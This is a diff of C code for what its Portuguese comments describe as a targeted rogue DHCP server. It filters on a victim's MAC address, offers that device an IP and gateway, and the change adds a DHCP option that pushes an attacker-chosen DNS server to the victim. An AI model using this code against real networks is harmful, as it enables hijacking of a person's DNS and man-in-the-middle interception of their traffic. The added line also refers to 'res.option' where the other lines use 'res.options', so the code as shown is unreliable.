@@ -103,7 +103,7 @@ int main() {
     uint32_t offered_ip = inet_addr("192.168.X.Y");  // IP que será oferecido ao alvo
     uint32_t subnet_mask = inet_addr("255.255.255.0");
     uint32_t gateway_ip = inet_addr("192.168.X.1");  // IP do roteador
-    
+
     // ================================================================
     // FILTRO SNIPER: MAC Alvo para teste
     // Substitua pelos bytes reais do dispositivo alvo
@@ -174,6 +174,8 @@ int main() {
                 add_dhcp_option(res.options, opt_offset, 54, 4, &server_ip);
                 // Adiciona lease time (Opção 51)
                 add_dhcp_option(res.options, opt_offset, 51, 4, &lease_time);
+                // Adiciona DNS
+                add_dhcp_option(res.option, opt_offset, 6, 4, &dns_ip);
 
                 // Marca o fim das opções
                 res.options[opt_offset++] = 255;
